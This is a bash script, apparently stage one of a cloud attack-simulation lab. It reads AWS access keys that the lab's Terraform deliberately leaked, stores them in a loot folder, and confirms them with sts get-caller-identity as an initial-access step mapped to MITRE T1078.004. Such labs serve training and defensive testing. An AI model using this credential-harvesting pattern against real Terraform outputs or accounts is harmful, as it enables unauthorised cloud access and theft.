#!/usr/bin/env bash
# Stage 0 — Initial Access (T1078.004 Valid Accounts: Cloud)
# Pulls the leaked access key that Terraform minted for the compromised user and
# stashes it in .loot/ so every later stage runs as the attacker, not as you.
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
require aws
require terraform

phase "Stage 0 — Initial Access"

TF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../terraform" && pwd)"

step "Reading leaked credentials from Terraform outputs"
akid="$(terraform -chdir="$TF_DIR" output -raw compromised_access_key_id 2>/dev/null || true)"
asec="$(terraform -chdir="$TF_DIR" output -raw compromised_secret_access_key 2>/dev/null || true)"

if [[ -z "$akid" || -z "$asec" ]]; then
  warn "Could not read compromised credentials from Terraform outputs."
  warn "Ensure the lab is deployed and the IAM module exposes:"
  warn "  compromised_access_key_id, compromised_secret_access_key (sensitive)"
  exit 1
fi

printf '%s' "$akid" > "$LOOT_DIR/access_key_id"
printf '%s' "$asec" > "$LOOT_DIR/secret_access_key"
chmod 600 "$LOOT_DIR/access_key_id" "$LOOT_DIR/secret_access_key"

step "Confirming the credential is live (sts:GetCallerIdentity)"
ident="$(att sts get-caller-identity --output json)"
echo "$ident" | tee "$LOOT_DIR/00-caller-identity.json"

ok "Foothold established as: $(echo "$ident" | grep -o '"Arn":[^,]*' | cut -d'"' -f4)"
echo "MITRE: T1078.004 Valid Accounts: Cloud Accounts"
